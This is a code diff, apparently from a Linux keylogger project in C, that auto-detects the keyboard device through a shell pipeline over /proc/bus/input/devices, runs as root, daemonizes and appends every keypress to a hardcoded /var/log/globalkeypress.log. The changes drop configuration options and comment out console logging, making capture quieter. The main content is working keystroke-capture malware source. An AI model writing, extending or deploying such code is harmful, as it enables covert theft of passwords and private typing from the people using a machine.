@@ -10,8 +10,6 @@
 
 #include "key_util.h"
 #include "util.h"
-#include "options.h"
-#include "config.h"
 
 #define KEY_RELEASE 0
 #define KEY_PRESS 1
@@ -47,19 +45,39 @@ static int openKeyboardDeviceFile(char *deviceFile) {
    return kbd_fd;
 }
 
+static char *getKeyboardDeviceFileName() {
+   static const char *command =
+      "grep -E 'Handlers|EV' /proc/bus/input/devices |"
+      "grep -B1 120013 |"
+      "grep -Eo event[0-9]+ |"
+      "tr '\\n' '\\0'";
+
+   FILE *pipe = popen(command, "r");
+   if (pipe == NULL) {
+      LOG_ERROR("Could not determine keyboard device file");
+   }
+
+   char result[20] = "/dev/input/";
+   char temp[9];
+   fgets(temp, 9, pipe);
+
+   pclose(pipe);
+   return strdup(strcat(result, temp));
+}
+
 int main(int argc, char **argv) {
    rootCheck();
 
-   Config config;
-   parseOptions(argc, argv, &config);
-
-   int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
+   char *deviceFile = getKeyboardDeviceFileName();
+   int kbd_fd = openKeyboardDeviceFile(deviceFile);
    assert(kbd_fd > 0);
 
-   FILE *logfile = fopen(config.logFile, "a");
+   char *logFile = "/var/log/globalkeypress.log";
+
+   FILE *logfile = fopen(logFile, "a");
    if (logfile == NULL) {
-      LOG_ERROR("Could not open log file");
-      exit(-1);
+     LOG_ERROR("Could not open log file");
+     exit(-1);
    }
 
    // We want to write to the file on every keypress, so disable buffering
@@ -68,8 +86,8 @@ int main(int argc, char **argv) {
    // Daemonize process. Don't change working directory but redirect standard
    // inputs and outputs to /dev/null
    if (daemon(1, 0) == -1) {
-      LOG_ERROR("%s", strerror(errno));
-      exit(-1);
+     LOG_ERROR("%s", strerror(errno));
+     exit(-1);
    }
 
    uint8_t shift_pressed = 0;
@@ -82,9 +100,9 @@ int main(int argc, char **argv) {
             }
             char *name = getKeyText(event.code, shift_pressed);
             if (strcmp(name, UNKNOWN_KEY) != 0) {
-               LOG("%s", name);
-               fputs(name, logfile);
-               fputs("\n", logfile);
+              //LOG("%s", name);
+              fputs(name, logfile);
+              fputs("\n", logfile);
             }
          } else if (event.value == KEY_RELEASE) {
             if (isShift(event.code)) {
@@ -95,8 +113,7 @@ int main(int argc, char **argv) {
       assert(shift_pressed >= 0 && shift_pressed <= 2);
    }
 
-   Config_cleanup(&config);
-   fclose(logfile);
    close(kbd_fd);
+   fclose(logfile);
    return 0;
 }
